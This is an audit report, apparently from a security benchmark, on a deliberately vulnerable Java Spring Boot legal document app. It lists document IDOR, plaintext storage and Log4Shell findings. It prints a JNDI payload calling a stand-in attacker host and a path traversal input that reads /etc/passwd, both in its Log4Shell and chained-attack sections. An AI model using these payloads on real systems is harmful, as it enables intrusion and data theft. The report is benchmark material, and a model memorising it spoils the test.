# Audit Report: app-09 — Legal Document Management

**Language:** Java (Spring Boot)  
**Business Domain:** Legal / Document Management  
**Date:** 2026-05-24

---

## Standalone Vulnerabilities

### VULN-01: A01 — Broken Access Control (Document IDOR)

**Severity:** High  
**Location:** `DocumentController.java:25-35` — `downloadDocument()`  
**Description:** Document download endpoint performs no ownership or case-access validation — any authenticated user can download any document.

**Difficulty: EASY**

- No ownership check on document retrieval
- Horizontal IDOR: user A can download user B's documents
- No case-level authorization verification

### VULN-02: A02 — Sensitive Data at Rest in Plaintext

**Severity:** High  
**Location:** `Document.java:15-30`  
**Description:** Legal contracts, lawsuit briefs, and depositions stored in plaintext database columns without encryption.

**Difficulty: EASY**

- Direct database access yields all sensitive legal content
- No encryption at rest
- Backup compromise would expose everything

### VULN-03: A06 — Log4Shell (Log4j 2.14.1)

**Severity:** Critical  
**Location:** `pom.xml:10-25`  
**Description:** Application uses Log4j 2.14.1, vulnerable to CVE-2021-44228 (Log4Shell). User-controlled request headers are logged.

**Difficulty: EASY**

- Classic Log4Shell: `${jndi:ldap://attacker.com/a}` in any log message triggers RCE
- Well-known, widely scanned vulnerability
- Multiple publicly available exploit tools

---

## Chained Attack: chain-01

**Chain Name:** Log4Shell Trigger → Path Traversal → Legal Document Exfiltration  
**Combined Impact:** Lateral Movement (Server Compromise + File Exfiltration)  
**Overall Chain Difficulty: MEDIUM**

### Link 1: Log4Shell RCE (A06 — Medium)

**Location:** `CaseController.java` — `createCase()`  
**Description:** Case title logged via Log4j 2.14.1 `logger.info()`; JNDI expression triggers remote code execution.

### Link 2: Path Traversal (A01 — High)

**Location:** `DocumentController.java` — `serveDocumentFile()`  
**Description:** File path concatenated to base path without normalization — `?name=../../etc/passwd` reads arbitrary files.

---

## Summary

App-09 is the most critically important app in the benchmark due to the Log4Shell vulnerability. CVE-2021-44228 is one of the most famous vulnerabilities of the decade. Combined with path traversal, the chain is devastating. The plaintext documents storage is also a serious finding. This app uniquely tests for Log4j detection, making it stand out among all apps.

**Overall Difficulty Score:** 1/5 (Easy — Log4Shell is well-known and easily exploitable)